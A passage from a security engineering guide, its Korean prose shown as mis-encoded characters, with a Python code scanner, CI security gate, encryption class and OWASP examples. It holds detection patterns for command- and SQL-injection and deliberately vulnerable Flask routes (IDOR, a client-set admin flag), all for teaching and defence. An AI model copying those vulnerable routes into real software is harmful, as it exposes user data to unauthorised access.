- [ ] ì†”íŠ¸ ì‚¬ìš© ì—¬ë¶€ (ë¹„ë°€ë²ˆí˜¸ í•´ì‹œ)
- [ ] í•˜ë“œì½”ë”©ëœ ì•”í˜¸í™” í‚¤ ì—†ìŒ
- [ ] ì•ˆì „í•œ ë‚œìˆ˜ ìƒì„±ê¸° ì‚¬ìš©

## 5. ì˜¤ë¥˜ ì²˜ë¦¬ ë° ë¡œê¹…

- [ ] ë¯¼ê°í•œ ì •ë³´ ë…¸ì¶œí•˜ì§€ ì•ŠëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€
- [ ] ì ì ˆí•œ ë¡œê¹… ìˆ˜ì¤€ ì„¤ì •
- [ ] ë¡œê·¸ì— ë¯¼ê°í•œ ì •ë³´ ë¯¸í¬í•¨
- [ ] ë³´ì•ˆ ì´ë²¤íŠ¸ ë¡œê¹… êµ¬í˜„

## 6. ë©”ëª¨ë¦¬ ë° ë¦¬ì†ŒìŠ¤ ê´€ë¦¬

- [ ] ë²„í¼ ì˜¤ë²„í”Œë¡œ ë°©ì§€
- [ ] ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ ë°©ì§€
- [ ] Use-After-Free ì·¨ì•½ì  ë°©ì§€
- [ ] ë¦¬ì†ŒìŠ¤ í•´ì œ (íŒŒì¼, ì†Œì¼“, DB ì—°ê²°)

## 7. ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ë³´ì•ˆ

- [ ] ê²½ìŸ ì¡°ê±´ ë°©ì§€
- [ ] ì¤‘ë³µ ì²˜ë¦¬ ë°©ì§€ (ê±°ë˜, ê²°ì œ)
- [ ] ì‹œê°„ ê¸°ë°˜ ê³µê²© ë°©ì§€
- [ ] ì—…ë¬´ íë¦„ ìš°íšŒ ë°©ì§€
```

###### ìë™í™”ëœ ì½”ë“œ ë¦¬ë·° ë„êµ¬ êµ¬í˜„

```python
# ìë™í™”ëœ ë³´ì•ˆ ì½”ë“œ ë¦¬ë·° ì‹œìŠ¤í…œ
import ast
import re
import os
from typing import List, Dict, Set
from dataclasses import dataclass
from enum import Enum

class SeverityLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class SecurityIssue:
    file_path: str
    line_number: int
    rule_id: str
    severity: SeverityLevel
    description: str
    recommendation: str
    code_snippet: str

class SecurityCodeAnalyzer:
    def __init__(self):
        self.issues: List[SecurityIssue] = []
        self.security_rules = self.load_security_rules()

    def load_security_rules(self) -> Dict:
        """ë³´ì•ˆ ê·œì¹™ ë¡œë“œ"""
        return {
            'hardcoded_secrets': {
                'patterns': [
                    r'(?i)(password|passwd|pwd)\s*=\s*["\'][^"\']{8,}["\']',
                    r'(?i)(api_key|apikey)\s*=\s*["\'][^"\']{20,}["\']',
                    r'(?i)(secret_key|secret)\s*=\s*["\'][^"\']{16,}["\']',
                    r'(?i)(token)\s*=\s*["\'][^"\']{32,}["\']',
                ],
                'severity': SeverityLevel.CRITICAL,
                'description': 'Hardcoded secret detected'
            },
            'sql_injection': {
                'patterns': [
                    r'execute\s*\(\s*["\'].*?%s.*?["\']',
                    r'query\s*\(\s*["\'].*?\+.*?["\']',
                    r'cursor\.execute\s*\(\s*["\'].*?%.*?["\']',
                ],
                'severity': SeverityLevel.HIGH,
                'description': 'Potential SQL injection vulnerability'
            },
            'command_injection': {
                'patterns': [
                    r'os\.system\s*\(',
                    r'subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True',
                    r'eval\s*\(',
                    r'exec\s*\(',
                ],
                'severity': SeverityLevel.HIGH,
                'description': 'Potential command injection vulnerability'
            },
            'weak_crypto': {
                'patterns': [
                    r'(?i)(md5|sha1)\s*\(',
                    r'(?i)DES\s*\(',
                    r'(?i)RC4\s*\(',
                    r'(?i)des\.new',
                ],
                'severity': SeverityLevel.MEDIUM,
                'description': 'Weak cryptographic algorithm detected'
            },
            'insecure_random': {
                'patterns': [
                    r'random\.(choice|randint|random)\s*\(',
                    r'Math\.random\s*\(',
                ],
                'severity': SeverityLevel.MEDIUM,
                'description': 'Insecure random number generation'
            }
        }

    def analyze_python_file(self, file_path: str) -> List[SecurityIssue]:
        """Python íŒŒì¼ ë³´ì•ˆ ë¶„ì„"""
        issues = []

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            # ì •ê·œì‹ ê¸°ë°˜ ê²€ì‚¬
            issues.extend(self.regex_analysis(file_path, content))

            # AST ê¸°ë°˜ ê²€ì‚¬
            issues.extend(self.ast_analysis(file_path, content))

        except Exception as e:
            print(f"Error analyzing {file_path}: {e}")

        return issues

    def regex_analysis(self, file_path: str, content: str) -> List[SecurityIssue]:
        """ì •ê·œì‹ ê¸°ë°˜ ë³´ì•ˆ ê²€ì‚¬"""
        issues = []
        lines = content.split('\n')

        for rule_name, rule_config in self.security_rules.items():
            for pattern in rule_config['patterns']:
                for line_num, line in enumerate(lines, 1):
                    matches = re.search(pattern, line)
                    if matches:
                        issues.append(SecurityIssue(
                            file_path=file_path,
                            line_number=line_num,
                            rule_id=rule_name,
                            severity=rule_config['severity'],
                            description=rule_config['description'],
                            recommendation=self.get_recommendation(rule_name),
                            code_snippet=line.strip()
                        ))

        return issues

    def ast_analysis(self, file_path: str, content: str) -> List[SecurityIssue]:
        """AST ê¸°ë°˜ ë³´ì•ˆ ê²€ì‚¬"""
        issues = []

        try:
            tree = ast.parse(content)
            visitor = SecurityASTVisitor(file_path)
            visitor.visit(tree)
            issues.extend(visitor.issues)
        except SyntaxError:
            # êµ¬ë¬¸ ì˜¤ë¥˜ê°€ ìˆëŠ” íŒŒì¼ì€ ê±´ë„ˆë›°ê¸°
            pass

        return issues

    def get_recommendation(self, rule_name: str) -> str:
        """ë³´ì•ˆ ê·œì¹™ë³„ ê¶Œì¥ì‚¬í•­"""
        recommendations = {
            'hardcoded_secrets': 'Use environment variables or secure configuration management',
            'sql_injection': 'Use parameterized queries or ORM',
            'command_injection': 'Avoid shell=True, use subprocess with argument lists',
            'weak_crypto': 'Use strong cryptographic algorithms (SHA-256, AES-256)',
            'insecure_random': 'Use cryptographically secure random generators'
        }
        return recommendations.get(rule_name, 'Review for security best practices')

    def generate_report(self, output_file: str = 'security_report.html'):
        """ë³´ì•ˆ ë¶„ì„ ë³´ê³ ì„œ ìƒì„±"""
        issues_by_severity = {
            SeverityLevel.CRITICAL: [],
            SeverityLevel.HIGH: [],
            SeverityLevel.MEDIUM: [],
            SeverityLevel.LOW: []
        }

        for issue in self.issues:
            issues_by_severity[issue.severity].append(issue)

        html_report = self.generate_html_report(issues_by_severity)

        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_report)

        print(f"Security report generated: {output_file}")

    def generate_html_report(self, issues_by_severity: Dict) -> str:
        """HTML í˜•ì‹ì˜ ë³´ê³ ì„œ ìƒì„±"""
        html = """
<!DOCTYPE html>
<html>
<head>
    <title>Security Code Review Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .critical { color: #dc3545; }
        .high { color: #fd7e14; }
        .medium { color: #ffc107; }
        .low { color: #28a745; }
        .issue { margin: 15px 0; padding: 10px; border-left: 4px solid; }
        .code { background: #f8f9fa; padding: 8px; margin: 5px 0; font-family: monospace; }
        .summary { background: #e9ecef; padding: 15px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <h1>Security Code Review Report</h1>
"""

        # ìš”ì•½ í†µê³„
        total_issues = sum(len(issues) for issues in issues_by_severity.values())
        html += f"""
    <div class="summary">
        <h2>Summary</h2>
        <p>Total Issues: {total_issues}</p>
        <ul>
            <li class="critical">Critical: {len(issues_by_severity[SeverityLevel.CRITICAL])}</li>
            <li class="high">High: {len(issues_by_severity[SeverityLevel.HIGH])}</li>
            <li class="medium">Medium: {len(issues_by_severity[SeverityLevel.MEDIUM])}</li>
            <li class="low">Low: {len(issues_by_severity[SeverityLevel.LOW])}</li>
        </ul>
    </div>
"""

        # ì‹¬ê°ë„ë³„ ì´ìŠˆ ëª©ë¡
        for severity, issues in issues_by_severity.items():
            if issues:
                html += f'<h2 class="{severity.value}">{severity.value.title()} Priority Issues</h2>'
                for issue in issues:
                    html += f"""
    <div class="issue" style="border-left-color: {'#dc3545' if severity == SeverityLevel.CRITICAL else '#fd7e14' if severity == SeverityLevel.HIGH else '#ffc107' if severity == SeverityLevel.MEDIUM else '#28a745'}">
        <h3>{issue.description}</h3>
        <p><strong>File:</strong> {issue.file_path}:{issue.line_number}</p>
        <p><strong>Rule ID:</strong> {issue.rule_id}</p>
        <div class="code">{issue.code_snippet}</div>
        <p><strong>Recommendation:</strong> {issue.recommendation}</p>
    </div>
"""

        html += "</body></html>"
        return html

class SecurityASTVisitor(ast.NodeVisitor):
    """ë³´ì•ˆ ê²€ì‚¬ìš© AST ë°©ë¬¸ì"""

    def __init__(self, file_path: str):
        self.file_path = file_path
        self.issues: List[SecurityIssue] = []

    def visit_Call(self, node):
        """í•¨ìˆ˜ í˜¸ì¶œ ë…¸ë“œ ë°©ë¬¸"""
        # ì•ˆì „í•˜ì§€ ì•Šì€ í•¨ìˆ˜ í˜¸ì¶œ ê²€ì‚¬
        if isinstance(node.func, ast.Name):
            if node.func.id == 'eval':
                self.issues.append(SecurityIssue(
                    file_path=self.file_path,
                    line_number=node.lineno,
                    rule_id='dangerous_eval',
                    severity=SeverityLevel.HIGH,
                    description='Use of dangerous eval() function',
                    recommendation='Avoid eval(), use safer alternatives',
                    code_snippet=f'Line {node.lineno}: eval() call detected'
                ))

        # ë©”ì„œë“œ í˜¸ì¶œ ê²€ì‚¬
        if isinstance(node.func, ast.Attribute):
            if (isinstance(node.func.value, ast.Name) and
                node.func.value.id == 'os' and node.func.attr == 'system'):
                self.issues.append(SecurityIssue(
                    file_path=self.file_path,
                    line_number=node.lineno,
                    rule_id='os_system',
                    severity=SeverityLevel.HIGH,
                    description='Use of os.system() can lead to command injection',
                    recommendation='Use subprocess with argument lists instead',
                    code_snippet=f'Line {node.lineno}: os.system() call detected'
                ))

        self.generic_visit(node)

    def visit_Str(self, node):
        """ë¬¸ìì—´ ë…¸ë“œ ë°©ë¬¸ (Python < 3.8)"""
        self.check_string_content(node.s, node.lineno)
        self.generic_visit(node)

    def visit_Constant(self, node):
        """ìƒìˆ˜ ë…¸ë“œ ë°©ë¬¸ (Python >= 3.8)"""
        if isinstance(node.value, str):
            self.check_string_content(node.value, node.lineno)
        self.generic_visit(node)

    def check_string_content(self, content: str, line_number: int):
        """ë¬¸ìì—´ ë‚´ìš© ê²€ì‚¬"""
        # SQL ì¿¼ë¦¬ íŒ¨í„´ ê²€ì‚¬
        sql_patterns = [
            r'SELECT.*FROM.*WHERE.*=.*%s',
            r'INSERT.*INTO.*VALUES.*%s',
            r'UPDATE.*SET.*=.*%s',
        ]

        for pattern in sql_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                self.issues.append(SecurityIssue(
                    file_path=self.file_path,
                    line_number=line_number,
                    rule_id='sql_string_format',
                    severity=SeverityLevel.HIGH,
                    description='SQL query with string formatting detected',
                    recommendation='Use parameterized queries',
                    code_snippet=f'Line {line_number}: SQL string formatting'
                ))

def analyze_project(project_path: str, extensions: List[str] = ['.py']) -> SecurityCodeAnalyzer:
    """í”„ë¡œì íŠ¸ ì „ì²´ ë³´ì•ˆ ë¶„ì„"""
    analyzer = SecurityCodeAnalyzer()

    for root, dirs, files in os.walk(project_path):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                file_path = os.path.join(root, file)
                issues = analyzer.analyze_python_file(file_path)
                analyzer.issues.extend(issues)

    return analyzer

# ì‚¬ìš© ì˜ˆì‹œ
if __name__ == "__main__":
    # í”„ë¡œì íŠ¸ ë¶„ì„
    project_path = "/path/to/your/project"
    analyzer = analyze_project(project_path)

    # ë³´ê³ ì„œ ìƒì„±
    analyzer.generate_report('security_analysis_report.html')

    # ì½˜ì†” ì¶œë ¥
    critical_issues = [issue for issue in analyzer.issues
                      if issue.severity == SeverityLevel.CRITICAL]

    if critical_issues:
        print(f"âš ï¸ Found {len(critical_issues)} critical security issues!")
        for issue in critical_issues[:5]:  # ìƒìœ„ 5ê°œë§Œ ì¶œë ¥
            print(f"  {issue.file_path}:{issue.line_number} - {issue.description}")
    else:
        print("âœ… No critical security issues found")
```

##### ì •ì  ë¶„ì„ ë„êµ¬ (SAST) í†µí•©

###### SonarQube ë³´ì•ˆ ê·œì¹™ ì»¤ìŠ¤í„°ë§ˆì´ì§•

```yaml
# sonar-project.properties
sonar.projectKey=my-secure-project
sonar.projectName=Secure Application
sonar.projectVersion=1.0
sonar.sources=src
sonar.tests=tests
sonar.language=py
sonar.python.coverage.reportPaths=coverage.xml
sonar.python.xunit.reportPath=test-reports/*.xml

# ë³´ì•ˆ ì¤‘ì‹¬ í’ˆì§ˆ í”„ë¡œíŒŒì¼
sonar.qualitygate.wait=true
sonar.qualitygate.timeout=300

# ë³´ì•ˆ ê´€ë ¨ ê·œì¹™ í™œì„±í™”
sonar.issue.ignore.multicriteria=e1,e2,e3
sonar.issue.ignore.multicriteria.e1.ruleKey=python:S1313
sonar.issue.ignore.multicriteria.e1.resourceKey=**/tests/**
sonar.issue.ignore.multicriteria.e2.ruleKey=python:S106
sonar.issue.ignore.multicriteria.e2.resourceKey=**/debug/**
sonar.issue.ignore.multicriteria.e3.ruleKey=python:S1192
sonar.issue.ignore.multicriteria.e3.resourceKey=**/constants.py
```

###### ë§ì¶¤í˜• ë³´ì•ˆ ë¶„ì„ íŒŒì´í”„ë¼ì¸
```yaml
# .github/workflows/security-analysis.yml
name: Security Analysis Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-scan:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
      with:
        fetch-depth: 0

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install bandit safety semgrep
        pip install -r requirements.txt

    - name: Run Bandit (Python security linter)
      run: |
        bandit -r . -f json -o bandit-report.json
      continue-on-error: true

    - name: Run Safety (dependency vulnerability scanner)
      run: |
        safety check --json --output safety-report.json
      continue-on-error: true

    - name: Run Semgrep (multi-language static analysis)
      run: |
        semgrep --config=auto --json --output=semgrep-report.json .
      continue-on-error: true

    - name: Run custom security analyzer
      run: |
        python security_analyzer.py --output custom-report.json

    - name: SonarCloud Scan
      uses: SonarSource/sonarcloud-github-action@master
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

    - name: Upload security reports
      uses: actions/upload-artifact@v3
      with:
        name: security-reports
        path: |
          bandit-report.json
          safety-report.json
          semgrep-report.json
          custom-report.json

    - name: Security Gate
      run: |
        python security_gate.py --reports bandit-report.json safety-report.json semgrep-report.json

  dependency-check:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3

    - name: Run OWASP Dependency Check
      uses: dependency-check/Dependency-Check_Action@main
      with:
        project: 'secure-app'
        path: '.'
        format: 'JSON'
        args: >
          --enableRetired
          --enableExperimental
          --failOnCVSS 7

    - name: Upload OWASP Dependency Check results
      uses: actions/upload-artifact@v3
      with:
        name: dependency-check-report
        path: reports/dependency-check-report.json
```

###### ë³´ì•ˆ ê²Œì´íŠ¸ êµ¬í˜„

```python
# security_gate.py - CI/CD íŒŒì´í”„ë¼ì¸ìš© ë³´ì•ˆ ê²Œì´íŠ¸
import json
import sys
import argparse
from typing import Dict, List, Any

class SecurityGate:
    def __init__(self, config_file: str = 'security-gate-config.json'):
        with open(config_file, 'r') as f:
            self.config = json.load(f)

    def evaluate_bandit_report(self, report_file: str) -> Dict[str, Any]:
        """Bandit ë³´ê³ ì„œ í‰ê°€"""
        with open(report_file, 'r') as f:
            report = json.load(f)

        high_severity = len([issue for issue in report.get('results', [])
                           if issue.get('issue_severity') == 'HIGH'])

        medium_severity = len([issue for issue in report.get('results', [])
                             if issue.get('issue_severity') == 'MEDIUM'])

        return {
            'tool': 'bandit',
            'high_issues': high_severity,
            'medium_issues': medium_severity,
            'passed': high_severity <= self.config['thresholds']['bandit']['high'] and
                     medium_severity <= self.config['thresholds']['bandit']['medium']
        }

    def evaluate_safety_report(self, report_file: str) -> Dict[str, Any]:
        """Safety ë³´ê³ ì„œ í‰ê°€"""
        try:
            with open(report_file, 'r') as f:
                report = json.load(f)

            vulnerabilities = len(report.get('vulnerabilities', []))

            return {
                'tool': 'safety',
                'vulnerabilities': vulnerabilities,
                'passed': vulnerabilities <= self.config['thresholds']['safety']['vulnerabilities']
            }
        except:
            return {'tool': 'safety', 'vulnerabilities': 0, 'passed': True}

    def evaluate_semgrep_report(self, report_file: str) -> Dict[str, Any]:
        """Semgrep ë³´ê³ ì„œ í‰ê°€"""
        with open(report_file, 'r') as f:
            report = json.load(f)

        critical_findings = len([finding for finding in report.get('results', [])
                               if finding.get('extra', {}).get('severity') == 'ERROR'])

        warning_findings = len([finding for finding in report.get('results', [])
                              if finding.get('extra', {}).get('severity') == 'WARNING'])

        return {
            'tool': 'semgrep',
            'critical_findings': critical_findings,
            'warning_findings': warning_findings,
            'passed': critical_findings <= self.config['thresholds']['semgrep']['critical'] and
                     warning_findings <= self.config['thresholds']['semgrep']['warning']
        }

    def evaluate_all_reports(self, report_files: List[str]) -> bool:
        """ëª¨ë“  ë³´ì•ˆ ë³´ê³ ì„œ í‰ê°€"""
        results = []
        overall_passed = True

        for report_file in report_files:
            if 'bandit' in report_file:
                result = self.evaluate_bandit_report(report_file)
            elif 'safety' in report_file:
                result = self.evaluate_safety_report(report_file)
            elif 'semgrep' in report_file:
                result = self.evaluate_semgrep_report(report_file)
            else:
                continue

            results.append(result)
            if not result['passed']:
                overall_passed = False

        # ê²°ê³¼ ì¶œë ¥
        print("Security Gate Results:")
        print("=" * 50)

        for result in results:
            status = "âœ… PASS" if result['passed'] else "âŒ FAIL"
            print(f"{result['tool'].upper()}: {status}")

            if result['tool'] == 'bandit':
                print(f"  High severity issues: {result['high_issues']}")
                print(f"  Medium severity issues: {result['medium_issues']}")
            elif result['tool'] == 'safety':
                print(f"  Vulnerabilities: {result['vulnerabilities']}")
            elif result['tool'] == 'semgrep':
                print(f"  Critical findings: {result['critical_findings']}")
                print(f"  Warning findings: {result['warning_findings']}")

        print("=" * 50)
        print(f"Overall result: {'âœ… PASS' if overall_passed else 'âŒ FAIL'}")

        return overall_passed

def main():
    parser = argparse.ArgumentParser(description='Security Gate Evaluator')
    parser.add_argument('--reports', nargs='+', required=True,
                       help='Security report files to evaluate')
    parser.add_argument('--config', default='security-gate-config.json',
                       help='Security gate configuration file')

    args = parser.parse_args()

    gate = SecurityGate(args.config)
    passed = gate.evaluate_all_reports(args.reports)

    # CI/CD íŒŒì´í”„ë¼ì¸ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ì ì ˆí•œ ì¢…ë£Œ ì½”ë“œ ë°˜í™˜
    sys.exit(0 if passed else 1)

if __name__ == "__main__":
    main()
```

###### ë³´ì•ˆ ê²Œì´íŠ¸ ì„¤ì • íŒŒì¼

```json
{
  "thresholds": {
    "bandit": {
      "high": 0,
      "medium": 5
    },
    "safety": {
      "vulnerabilities": 0
    },
    "semgrep": {
      "critical": 0,
      "warning": 10
    }
  },
  "notifications": {
    "slack": {
      "webhook_url": "https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK",
      "channel": "#security",
      "on_failure": true,
      "on_success": false
    },
    "email": {
      "smtp_server": "smtp.company.com",
      "recipients": ["security-team@company.com"],
      "on_failure": true,
      "on_success": false
    }
  },
  "exemptions": {
    "files": [
      "tests/**",
      "docs/**",
      "scripts/legacy/**"
    ],
    "rules": {
      "bandit": ["B101", "B601"],
      "semgrep": ["python.lang.correctness.tempfile.flush"]
    }
  }
}
```

### 4.2 ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ ì‹¬í™”

#### 4.2.1 OWASP Top 10 2021 ì‹¬í™” ë¶„ì„

##### A01: Broken Access Control (ì ‘ê·¼ ì œì–´ ì‹¤íŒ¨)

###### ì‹¬í™” ì·¨ì•½ì  ë¶„ì„

```python
# ì·¨ì•½í•œ ì ‘ê·¼ ì œì–´ ì˜ˆì‹œ
from flask import Flask, request, session, jsonify
import functools

app = Flask(__name__)

# ì·¨ì•½í•œ ì½”ë“œ - ì§ì ‘ ê°ì²´ ì°¸ì¡° ì·¨ì•½ì  (IDOR)
@app.route('/api/user/<int:user_id>')
def get_user(user_id):
    # ì„¸ì…˜ ì‚¬ìš©ìì™€ ìš”ì²­ëœ ì‚¬ìš©ì ID ë¹„êµ ì—†ìŒ
    user = database.get_user(user_id)
    return jsonify(user.to_dict())

# ì·¨ì•½í•œ ì½”ë“œ - ê¶Œí•œ ê²€ì‚¬ ìš°íšŒ
@app.route('/admin/users')
def admin_users():
    # URLì„ ì§ì ‘ ì ‘ê·¼í•˜ë©´ ê¶Œí•œ ê²€ì‚¬ ìš°íšŒ ê°€ëŠ¥
    if request.args.get('admin') == 'true':  # í´ë¼ì´ì–¸íŠ¸ ì œì–´ ê°€ëŠ¥
        users = database.get_all_users()
        return render_template('admin_users.html', users=users)
    return "Access Denied", 403

# ì•ˆì „í•œ ì ‘ê·¼ ì œì–´ êµ¬í˜„
def require_authentication(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Authentication required'}), 401
        return f(*args, **kwargs)
    return decorated_function

def require_authorization(required_role):
    def decorator(f):
        @functools.wraps(f)
        def decorated_function(*args, **kwargs):
            user = database.get_user(session['user_id'])
            if not user or not user.has_role(required_role):
                return jsonify({'error': 'Insufficient privileges'}), 403
            return f(*args, **kwargs)
        return decorated_function
    return decorator

def require_ownership(resource_field='user_id'):
    def decorator(f):
        @functools.wraps(f)
        def decorated_function(*args, **kwargs):
            current_user_id = session.get('user_id')
            resource_id = kwargs.get(resource_field)

            # ë¦¬ì†ŒìŠ¤ ì†Œìœ ê¶Œ í™•ì¸
            resource = database.get_resource(resource_id)
            if not resource or resource.owner_id != current_user_id:
                return jsonify({'error': 'Access denied'}), 403
            return f(*args, **kwargs)
        return decorated_function
    return decorator

# ì•ˆì „í•œ ì½”ë“œ
@app.route('/api/user/<int:user_id>')
@require_authentication
@require_ownership('user_id')
def get_user_secure(user_id):
    user = database.get_user(user_id)
    return jsonify(user.to_dict())

@app.route('/admin/users')
@require_authentication
@require_authorization('admin')
def admin_users_secure():
    users = database.get_all_users()
    return render_template('admin_users.html', users=users)
```

##### A02: Cryptographic Failures (ì•”í˜¸í™” ì‹¤íŒ¨)

###### ì‹¤ì œ ì•”í˜¸í™” êµ¬í˜„ ì‹œë‚˜ë¦¬ì˜¤

```python
# ê³ ê¸‰ ì•”í˜¸í™” ì‹œìŠ¤í…œ êµ¬í˜„
import os
import base64
import hashlib
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import secrets
import time

class EnterpriseEncryptionSystem:
    def __init__(self):
        self.backend = default_backend()

    def generate_rsa_keypair(self, key_size=4096):
        """RSA í‚¤í˜ì–´ ìƒì„± (4096ë¹„íŠ¸)"""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
            backend=self.backend
        )

        # PEM í˜•ì‹ìœ¼ë¡œ ì§ë ¬í™”
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.BestAvailableEncryption(
                password=self.generate_key_encryption_password()
            )
        )

        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        return private_pem, public_pem

    def generate_key_encryption_password(self, length=32):
        """í‚¤ ì•”í˜¸í™”ìš© ê°•ë ¥í•œ íŒ¨ìŠ¤ì›Œë“œ ìƒì„±"""
        return secrets.token_bytes(length)

    def hybrid_encrypt(self, data: bytes, public_key_pem: bytes) -> dict:
        """í•˜ì´ë¸Œë¦¬ë“œ ì•”í˜¸í™” (RSA + AES)"""
        # AES í‚¤ ìƒì„±
        aes_key = secrets.token_bytes(32)  # 256ë¹„íŠ¸
        iv = secrets.token_bytes(16)  # 128ë¹„íŠ¸

        # AES-GCMìœ¼ë¡œ ë°ì´í„° ì•”í˜¸í™”
        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(iv), backend=self.backend)
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()

        # RSAë¡œ AES í‚¤ ì•”í˜¸í™”
        public_key = serialization.load_pem_public_key(
            public_key_pem, backend=self.backend
        )

        encrypted_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        return {
            'encrypted_data': base64.b64encode(encrypted_data).decode(),
            'encrypted_key': base64.b64encode(encrypted_key).decode(),
            'iv': base64.b64encode(iv).decode(),
            'auth_tag': base64.b64encode(encryptor.tag).decode(),
            'algorithm': 'RSA-4096+AES-256-GCM'
        }

    def hybrid_decrypt(self, encrypted_package: dict, private_key_pem: bytes,
                      key_password: bytes) -> bytes:
        """í•˜ì´ë¸Œë¦¬ë“œ ë³µí˜¸í™”"""
        # RSA ê°œì¸í‚¤ë¡œ AES í‚¤ ë³µí˜¸í™”
        private_key = serialization.load_pem_private_key(
            private_key_pem, password=key_password, backend=self.backend
        )

        encrypted_key = base64.b64decode(encrypted_package['encrypted_key'])
        aes_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # AES-GCMìœ¼ë¡œ ë°ì´í„° ë³µí˜¸í™”
        encrypted_data = base64.b64decode(encrypted_package['encrypted_data'])
        iv = base64.b64decode(encrypted_package['iv'])
        auth_tag = base64.b64decode(encrypted_package['auth_tag'])

        cipher = Cipher(
            algorithms.AES(aes_key),
            modes.GCM(iv, auth_tag),
            backend=self.backend
        )
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        return decrypted_data

    def secure_key_derivation(self, password: str, salt: bytes = None,
                             iterations: int = 480000) -> dict:
        """PBKDF2ë¥¼ ì‚¬ìš©í•œ ì•ˆì „í•œ í‚¤ ìœ ë„"""
        if salt is None:
            salt = secrets.token_bytes(32)

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=iterations,
            backend=self.backend
        )

        start_time = time.time()
        key = kdf.derive(password.encode())
        derivation_time = time.time() - start_time

        return {
            'key': base64.b64encode(key).decode(),
            'salt': base64.b64encode(salt).decode(),
            'iterations': iterations,
            'derivation_time_ms': int(derivation_time * 1000),
            'algorithm': 'PBKDF2-HMAC-SHA256'
        }

    def create_digital_signature(self, data: bytes, private_key_pem: bytes,
                                key_password: bytes) -> str:
        """ë””ì§€í„¸ ì„œëª… ìƒì„±"""
        private_key = serialization.load_pem_private_key(
            private_key_pem, password=key_password, backend=self.backend
        )

        signature = private_key.sign(
            data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )

        return base64.b64encode(signature).decode()

    def verify_digital_signature(self, data: bytes, signature: str,
                                 public_key_pem: bytes) -> bool:
        """ë””ì§€í„¸ ì„œëª… ê²€ì¦"""
        try:
            public_key = serialization.load_pem_public_key(
                public_key_pem, backend=self.backend
            )

            signature_bytes = base64.b64decode(signature)

            public_key.verify(
                signature_bytes,
                data,
                padding.PSS(
                    mgf=padding.MGF1(hashes.SHA256()),
                    salt_length=padding.PSS.MAX_LENGTH
                ),
                hashes.SHA256()
            )
            return True

        except Exception:
            return False

# ì‚¬ìš© ì˜ˆì‹œ
crypto_system = EnterpriseEncryptionSystem()

# í‚¤í˜ì–´ ìƒì„±
private_key_pem, public_key_pem = crypto_system.generate_rsa_keypair()

# ì¤‘ìš”í•œ ë°ì´í„° ì•”í˜¸í™”
sensitive_data = b"Highly confidential business data"
encrypted_package = crypto_system.hybrid_encrypt(sensitive_data, public_key_pem)

print("Encrypted package created:", encrypted_package['algorithm'])
```

##### A03: Injection (ì¸ì ì…˜)

###### SQL ì¸ì ì…˜ ê³ ê¸‰ ê³µê²© ë° ë°©ì–´

```python
# ê³ ê¸‰ SQL ì¸ì ì…˜ ë°©ì–´ ì‹œìŠ¤í…œ
import re
import sqlite3
from typing import List, Dict, Any, Optional
import logging

class SQLInjectionDefense:
    def __init__(self, db_connection):
        self.conn = db_connection
        self.logger = logging.getLogger(__name__)
        self.injection_patterns = self.load_injection_patterns()

    def load_injection_patterns(self) -> List[str]:
        """SQL ì¸ì ì…˜ íŒ¨í„´ ë¡œë“œ"""
        return [
            r"('|(\\')|(;)|(\\;)|(--)|((\\--)|-))",  # ê¸°ë³¸ SQL ë©”íƒ€ë¬¸ì
            r"((\s)*(union)(\s)+(select)(\s)*)",  # UNION ê³µê²©
            r"((\s)*(select)(\s)+(.)*(\s)+(from)(\s)+)",  # SELECT ë¬¸
            r"((\s)*(insert)(\s)+(.)*(\s)+(into)(\s)+)",  # INSERT ë¬¸
            r"((\s)*(update)(\s)+(.)*(\s)+(set)(\s)+)",  # UPDATE ë¬¸
